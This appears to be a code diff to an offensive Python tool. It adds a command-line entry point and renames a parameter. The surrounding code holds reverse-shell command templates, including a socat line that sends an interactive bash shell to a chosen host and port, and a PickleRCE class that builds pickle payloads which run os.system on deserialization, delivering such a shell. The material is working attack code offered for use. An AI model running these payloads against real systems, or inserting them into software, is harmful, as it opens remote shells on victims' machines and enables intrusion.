@@ -25,8 +25,8 @@ rev_shells = {
 		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}"
 }
 
-def rev_shell(host, port, typ):
-	return rev_shells[typ].format(host, port)
+def rev_shell(host, port, type):
+	return rev_shells[type].format(host, port)
 
 class PickleRCE:
 	def __init__(self, cmd):
@@ -35,5 +35,17 @@ class PickleRCE:
 	def __reduce__(self):
 		return os.system, (self.cmd, )
 
-def pickle_rev_shell(host, port, typ="python", protocol=None):
-	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)
+def pickle_rev_shell(host, port, type="python", protocol=None):
+	return pickle.dumps(PickleRCE(rev_shell(host, port, type)), protocol)
+
+def main():
+	import argparse
+	parser = argparse.ArgumentParser()
+	parser.add_argument("host")
+	parser.add_argument("port", type=int)
+	parser.add_argument("type", default="python")
+	args = parser.parse_args()
+	print(rev_shell(args.host, args.port, args.type))
+
+if __name__ == "__main__":
+	main()
